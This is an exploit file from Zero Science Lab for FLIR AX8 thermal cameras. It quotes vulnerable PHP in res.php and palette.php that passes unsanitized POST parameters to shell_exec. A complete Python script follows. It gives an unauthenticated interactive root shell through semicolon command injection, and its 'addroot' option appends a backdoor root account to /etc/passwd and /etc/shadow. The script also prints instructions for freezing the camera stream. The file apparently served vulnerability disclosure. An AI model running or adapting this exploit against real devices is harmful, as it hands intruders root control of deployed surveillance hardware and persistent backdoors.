# Author: Gjoko &#039;LiquidWorm&#039; Krstic @zeroscience
# Vendor: FLIR Systems, Inc.
# Product web page: https://www.flir.com
# Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3, Hardware: Flir Systems Neco Board
# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
# References:
# Advisory ID: ZSL-2018-5491
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5491.php
 
# Desc: The FLIR AX8 thermal sensor camera suffers from two unauthenticated
# command injection vulnerabilities. The issues can be triggered when calling
# multiple unsanitized HTTP GET/POST parameters within the shell_exec function
# in res.php and palette.php file. This can be exploited to inject arbitrary
# system commands and gain root remote code execution.
 
# /FLIR/usr/www/res.php:
# ----------------------
# 1. <?php
# 2.   if (isset($_POST["action"])) {
# 3.     switch ($_POST["action"]) {
# 4.       case "get":
# 5.         if(isset($_POST["resource"]))
# 6.         {
# 7.           switch ($_POST["resource"]) {
# 8.             case ".rtp.hflip":
# 9.               if (!file_exists("/FLIR/system/journal.d/horizontal_flip.cfg")) {
# 10.                $result = "false";
# 11.                break;
# 12.              }
# 13.              $result = file_get_contents("/FLIR/system/journal.d/horizontal_flip.cfg") === "1" ? "true" : "false";
# 14.              break;
# 15.            case ".rtp.vflip":
# 16.              if (!file_exists("/FLIR/system/journal.d/vertical_flip.cfg")) {
# 17.                $result = "false";
# 18.                break;
# 19.              }
# 20.              $result = file_get_contents("/FLIR/system/journal.d/vertical_flip.cfg") === "1" ? "true" : "false";
# 21.              break;
# 22.            default:
# 23.              $result = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o ".$_POST["resource"]));
# 24.          }
# 25.        }
 
# /FLIR/usr/www/palette.php:
# --------------------------
# 1. <?php
# 2.   if(isset($_POST["palette"])){
# 3.     shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/palette ".$_POST["palette"]);
# 4.     echo json_encode(array("success"));
# 5.   }
# 6. ?>
 
 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import requests
import colorama
import random##
import time####
import json####
import sys#####
import os######
 
piton = os.path.basename(sys.argv[0])
 
if len(sys.argv) < 2:
    print &#039;\n\x20\x20[*] Usage: &#039;+piton+&#039; <ip:port>\n&#039;
    sys.exit()
 
bannah = """
.---------------------------------.
|         1984 Pictures           |
|                                 |
|                  ___            |
|                [|   |=|{)__     |
|                 |___| \/   )    |
|                  /|\      /|    |
|                 / | \     | \\   |
.---------------------------------.
"""
print bannah
time.sleep(4)
os.system(&#039;clear&#039;)
 
print &#039;\nFLIR AX8 Thermal Camera Remote Root Exploit&#039;
print &#039;By Zero Science Lab&#039;
 
ICU = &#039;&#039;&#039;
                ````````                
           `./+ooosoooooo+/.`           
        `.+ss+//:::::::://+ss+.`        
       -oyo/::::-------:::::/oyo-       
     `/yo+:::-------.------:::+oy/`     
    `+yo+::---...........----:/+oy+`    
   `/yo++/--...../+oo+:....---:/+oy/`   
   `ss++//:-.../yhhhhhhy/...-://++ss`   
   .ho++/::--.-yhhddddhhy-.--:://+oh.   
   .ho+//::---/mmmmmmmmmm:---::/++oh.   
   `ss++//::---+mNNNNNNm+---:://++ss`   
   `/yo+//:::----+syys+-----://++oy/`   
    `+yo++//:::-----------:://++oy+`    
     `/yo++///:::::-:::::://+++oy/`     
       .oyo+++////////////+++oyo.       
        `.+ssoo++++++++++ooss+.`        
           `./+osssssssso+/.`           
                ````````                
&#039;&#039;&#039;
 
colors = list(vars(colorama.Fore).values())
colored_chars = [random.choice(colors) + char for char in ICU]
 
print(&#039;&#039;.join(colored_chars))
 
print
print &#039;\x1b[1;37;44m&#039;+&#039;To freeze the stream run:   &#039;+&#039;\x1b[0m&#039;+&#039; /FLIR/usr/bin/freeze on&#039;
print &#039;\x1b[1;37;41m&#039;+&#039;To unfreeze the stream run: &#039;+&#039;\x1b[0m&#039;+&#039; /FLIR/usr/bin/freeze off\n&#039;
 
print &#039;[*] Additional commands:&#039;
print &#039; [+] \&#039;addroot\&#039; for add root user.&#039;
print &#039; [+] \&#039;exit\&#039; for exit.\n&#039;
 
while True:
 
    zeTargets = &#039;http://&#039;+sys.argv[1]+&#039;/res.php&#039;
    zeCommand = raw_input(&#039;\x1b[0;96;49m&#039;+&#039;root@neco-0J0X17:~# &#039;+&#039;\x1b[0m&#039;)
    zeHeaders = {&#039;Cache-Control&#039;   : &#039;max-age=0&#039;,
                 &#039;User-Agent&#039;      : &#039;thricer/251.4ev4h&#039;,
                 &#039;Accept&#039;          : &#039;text/html,application/xhtml+xml&#039;,
                 &#039;Accept-Encoding&#039; : &#039;gzip, deflate&#039;,
                 &#039;Accept-Language&#039; : &#039;mk-MK,mk;q=1.7&#039;,
                 &#039;Connection&#039;      : &#039;close&#039;,
                 &#039;Connection-Type&#039; : &#039;application/x-www-form-urlencoded&#039;}
    zePardata = {&#039;action&#039;          : &#039;get&#039;,
                 &#039;resource&#039;        : &#039;;&#039;+zeCommand}
 
    try:
 
        zeRequest = requests.post(zeTargets, headers=zeHeaders, data=zePardata)
        print json.loads(zeRequest.text)
 
        if zeCommand.strip() == &#039;exit&#039;:
            sys.exit()
 
        if zeCommand.strip() == &#039;addroot&#039;:
            print &#039;[+] Blind command injection using palette.php...&#039;
            print &#039;[+] Adding user \&#039;roOt\&#039; with password \&#039;rewt\&#039; in shadow file...&#039;
 
            nuTargets = &#039;http://&#039;+sys.argv[1]+&#039;/palette.php&#039;
            nuHeaders = zeHeaders
 
            nuHexstrn = (&#039;\\x72\\x6f\\x4f\\x74\\x3a\\x24\\x31&#039;
                         &#039;\\x24\\x4d\\x4a\\x4f\\x6e\\x56\\x2f&#039;
                         &#039;\\x59\\x33\\x24\\x74\\x44\\x6e\\x4d&#039;
                         &#039;\\x49\\x42\\x4d\\x79\\x30\\x6c\\x45&#039;
                         &#039;\\x51\\x32\\x6b\\x44\\x70\\x66\\x67&#039;
                         &#039;\\x54\\x4a\\x50\\x30\\x3a\\x31\\x36&#039;
                         &#039;\\x39\\x31\\x34\\x3a\\x30\\x3a\\x39&#039;
                         &#039;\\x39\\x39\\x39\\x39\\x3a\\x37\\x3a&#039;
                         &#039;\\x3a\\x3a\\x0a\\x0d&#039;)
 
            nuPadata1 = {&#039;palette&#039; : &#039;1;echo \"roOt:x:0:0:pwn:/sys:/bin/bash\" >> /etc/passwd&#039;}
            nuPadata2 = {&#039;palette&#039; : &#039;1;echo -n -e \"&#039;+nuHexstrn+&#039;\" >> /etc/shadow&#039;}
 
            requests.post(nuTargets, headers=nuHeaders, data=nuPadata1)
            time.sleep(2)
            requests.post(nuTargets, headers=nuHeaders, data=nuPadata2)
             
            print &#039;[*] Success!\n&#039;
        else: pass
 
    except Exception:
        print &#039;[*] Error!&#039;
        break
 
sys.exit()

